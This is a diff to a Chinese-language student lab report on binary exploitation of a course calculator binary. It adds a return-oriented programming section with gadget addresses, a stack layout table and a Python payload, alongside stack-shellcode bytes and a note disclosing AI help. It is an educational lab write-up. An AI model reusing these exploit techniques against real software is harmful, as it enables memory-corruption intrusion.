@@ -69,7 +69,7 @@ payload = b"./malware" + b"\x00" * 7 + b"\xf0\x0f\x80\x00\x10\x72\x00\x00" + b"\
 
 - 类似 3(Task1)，把 `0x0000721000800fe8` 处的返回地址改为 `expression` 的地址 `0x0000721000800fd0`；不能改为 `command_buf` 是因为 `strcpy` 遇到第一个 `0x00` 就停止，后面的 shellcode 不会被复制；不能直接跳到 `grade_eval`，需要先把参数寄存器 `edi` 置为 4。
 - `expression` 缓冲区一共只有 16 字节，正好用来放 shellcode；它后面的 `0x0000721000800fe0` 存放 `rbp`，`0x0000721000800fe8` 存放返回地址。
-- 我最初独立完成的版本是 `mov edi,4; mov ebx,0x401a87; call rbx; ret`：能正确输出目标字符串，但 `grade_eval` 的 `mov %edi,-0x4(%rbp)` 会把参数 4 写到 `0x0000721000800fdc`，覆盖 shellcode 末尾的 `ret`（在 `0xfdc`）；`grade_eval` 返回后从 `0xfdc` 执行 `04 00 00 00`（`add al,0; add [rax],al`），此时 `rax=0`，于是在 `0xfde` 触发段错误（见 `assets/5.png`）。崩溃发生在打印之后，不影响输出，但程序不能正常退出。
+- 我最初独立完成的版本是 `mov edi,4; mov ebx,0x401a87; call rbx; ret`：能正确输出目标字符串，但 `grade_eval` 的 `mov %edi,-0x4(%rbp)` 会把参数 4 写到 `0x0000721000800fdc`，覆盖 shellcode 末尾的 `ret`（在 `0xfdc`）；`grade_eval` 返回后从 `0xfdc` 执行 `04 00 00 00`（`add al,0; add [rax],al`），此时 `rax=0`，于是在 `0xfde` 触发段错误。崩溃发生在打印之后，不影响输出，但程序不能正常退出。
 - 修改：不用 `call`，而是先把 `grade_eval` 返回后要去的 `0x401c1f`（`__wrap_main+0x11` 的 `mov rsp,r12; pop r12; ret`）压栈，再 `jmp rbx` 进入 `grade_eval`；这样 `grade_eval` 的 `leave/ret` 直接回到 `0x401c1f`，恢复 libc 栈，程序正常退出。
 
 那么构造如下（15 字节指令 + 1 字节填充 + 保存的 `rbp` + 返回地址）：
@@ -85,7 +85,43 @@ payload = b"\xbb\x87\x1a\x40\x00" + b"\x68\x1f\x1c\x40\x00" + b"\x6a\x04" + b"\x
 
 ### 6. ROP (10 pts 测试 + 10 pts 报告)
 
+- `dark-calc-nx` 非 PIE（gadget 地址固定），但栈 NX 且地址随机，不能像第 5 题那样执行栈上 shellcode。改为劫持 `input` 的返回地址，用 `.text` 里的 gadget 拼出 `grade_eval(4)`。
 
+- `expression` 在 `rbp-0x10`，payload 偏移 0x10 覆盖保存的 `rbp`，0x18 覆盖返回地址，0x20 起是链的 8 字节槽。`input` 的 `leave; ret` 在 `gets`/`strcpy` 后执行：`ret` 取出 `rbp+8` 处的第一个地址，并把 `rsp` 指向 `rbp+0x10`；之后每个 gadget 的 `ret` 依次弹下一格。链只依赖 `rsp`，所以栈的 ASLR 不影响它。
+
+- gadget 在 `0x4019d0–0x401ae3`。x86 指令变长，`objdump -s` 只能看字节，要用 `objdump -d`，并注意从指令中间开始的未对齐 gadget。`__libc_csu_init` 结尾的 `41 5f c3` 中，从 `0x401a33` 看是 `5f c3`，即 `pop rdi; ret`；`0x401a40` 是 `f3 c3`（`repz ret`），可当单独的 `ret`。`grade_eval` 入口 `0x401978`，`exit@plt` 是 `0x4016e0`。
+
+- `grade_eval` 只在 `edi == 4` 时打印，所以先用 `pop rdi; ret` 把 4 放进 `rdi`，再跳到 `grade_eval`；它结尾的 `leave; ret` 回到下一格。然后用 `pop rdi; ret` 把 0 放进 `rdi`，跳到 `exit@plt`。
+
+| 偏移 | 值 | 作用 |
+|---|---|---|
+| 0x00 | `b"A"*16` | 填满 `expression` |
+| 0x10 | `b"B"*8` | 保存的 `rbp` |
+| 0x18 | `0x401a33` | `pop rdi; ret` |
+| 0x20 | `4` | `rdi = 4` |
+| 0x28 | `0x401a40` | `ret`，对齐 |
+| 0x30 | `0x401978` | `grade_eval(4)` |
+| 0x38 | `0x401a33` | `pop rdi; ret` |
+| 0x40 | `0` | `rdi = 0` |
+| 0x48 | `0x401a40` | `ret`，对齐 |
+| 0x50 | `0x4016e0` | `exit(0)` |
+
+- `input` 的 `rbp` 是 16 字节对齐的，`ret` 后 `rsp = rbp+0x10`，第一个 gadget 入口 `rsp % 16 == 0`；ABI 要求函数入口为 8。`grade_eval` 里的 `printf` 在部分 glibc 上会因不对齐崩溃，所以在 `grade_eval` 和 `exit` 前各插一个 `ret`（`0x401a40`）。GDB 确认两者入口 `rsp % 16 == 8`，且 `edi` 分别为 4 和 0。
+
+构造如下：
+```python
+p64 = lambda x: x.to_bytes(8, "little")
+payload = (
+    b"A" * 16 + b"B" * 8
+    + p64(0x401a33) + p64(4) + p64(0x401a40)   # rdi=4，对齐
+    + p64(0x401978)                            # grade_eval(4)
+    + p64(0x401a33) + p64(0) + p64(0x401a40)   # rdi=0，对齐
+    + p64(0x4016e0)                            # exit(0)
+)
+```
+
+输出：
+![6](assets/6.png)
 
 ### 7. Canary (10 pts 测试 + 10 pts 报告)
 
@@ -95,5 +131,6 @@ payload = b"\xbb\x87\x1a\x40\x00" + b"\x68\x1f\x1c\x40\x00" + b"\x6a\x04" + b"\x
 
 - DeepSeek-V4.1-Flash-1017（通过 dsh 使用）：
   - 任务 1：帮助确认答案的出处。
-  - 任务 5：最初仅用于查询 `call` 指令的语法；段错误的定位和修改由 AI 辅助完成。我在没有 AI 帮助时独立完成的最好成绩是 payload 能正确输出 `Hope A will be your grade!`，但程序在打印后触发段错误（见 `assets/5.png`）。AI 指出 `grade_eval` 的 `mov %edi,-0x4(%rbp)` 覆盖了栈上 shellcode 末尾的 `ret`，并建议改用 `push 返回地址; jmp rbx` 让程序正常退出（修改后的输出见第 5 节）。
-- 除上述说明外，1–4 题的答案、payload 的构造与地址计算均由我独立完成。
+  - 任务 5：最初仅用于查询 `call` 指令的语法；段错误的定位和修改由 AI 辅助完成。我在没有 AI 帮助时独立完成的最好成绩是 payload 能正确输出 `Hope A will be your grade!`，但程序在打印后触发段错误（见 `assets/5-1.png`）。AI 指出 `grade_eval` 的 `mov %edi,-0x4(%rbp)` 覆盖了栈上 shellcode 末尾的 `ret`，并建议改用 `push 返回地址; jmp rbx` 让程序正常退出（修改后的输出见第 5 节）。
+  - 任务 6：ROP 的整体思路、gadget 地址（`pop rdi; ret`、`ret`）和链布局由 AI 提示，`payload_rop.py` 与本节报告由 AI 辅助完成并在本机验证。
+- 除上述说明外，1–4 题的答案、payload 的构造与地址计算均由我独立完成。（git 仓库中 AI 辅助完成部分会标明 AI Assisted，不完美的历史记录可以在 git 的 commit 记录中找到）
